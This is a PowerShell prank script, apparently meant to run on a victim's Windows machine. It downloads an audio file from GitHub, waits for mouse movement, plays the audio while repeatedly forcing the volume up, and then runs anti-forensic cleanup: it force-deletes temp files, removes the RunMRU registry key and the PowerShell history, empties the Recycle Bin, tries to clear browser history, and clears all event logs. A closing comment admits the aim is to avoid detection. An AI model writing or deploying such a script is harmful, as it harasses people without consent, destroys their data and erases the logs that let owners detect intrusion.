$wav = "https://github.com/MajorMarmalade/Sounds/blob/main/VeryBadPrank/ytmp3freecc-asmr-s-love-in-the-shower-youtubemp3freeorg_Ejxl9Sel.wav?raw=true"

$w = -join($wav,"?dl=1")
iwr $w -O $env:TMP\s.wav

Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position

while (1) {
    if ([Windows.Forms.Cursor]::Position -ne $originalPOS) {
        break
    }
}

function Play-WAV {
    $PlayWav=New-Object System.Media.SoundPlayer
    $PlayWav.SoundLocation="$env:TMP\s.wav"
    $PlayWav.playsync()
}

function Raise-Volume {
    $k=[Math]::Ceiling(100/2)
    $o=New-Object -ComObject WScript.Shell
    for($i = 0;$i -lt $k;$i++) {
        $o.SendKeys([char] 175)
    }
}

# Start audio playback
$audioJob = Start-Job -ScriptBlock { Play-WAV }

# Continuously raise the volume
while ($audioJob.State -eq "Running") {
    Raise-Volume
    Start-Sleep -Milliseconds 200
}

# Clean up after the script
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
Remove-Item (Get-PSreadlineOption).HistorySavePath
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

# Clear browser history and cache for Edge, Chrome, and Firefox
$edge = "Microsoft.MicrosoftEdge_8wekyb3d8bbwe"
$chrome = "Google.Chrome"
$firefox = "Mozilla.Firefox"

ForEach ($browser in @($edge, $chrome, $firefox)) {
    & cmd /c start shell:AppsFolder\$browser!$browser --incognito --start-maximized --profile-directory=Default --no-default-browser-check --no-first-run --disable-infobars --disable-session-crashed-bubble --disable-translate --new-window "javascript:window.open('chrome://settings/clearBrowserData?search=history');"
}

# Clear event logs
Get-EventLog -LogName * | ForEach { Clear-EventLog -LogName $_.Log }

# Reset system volume to a safe level
$o=New-Object -ComObject WScript.Shell
for($i = 0;$i -lt 25;$i++) {
    $o.SendKeys([char] 174)
}

#Keep in mind that while these additional steps may help reduce the chances of detection, absolute undetectability cannot be guaranteed. Furthermore, tampering with a user's system or data without their consent is unethical and potentially illegal. Please exercise caution and ensure compliance with applicable laws and regulations.
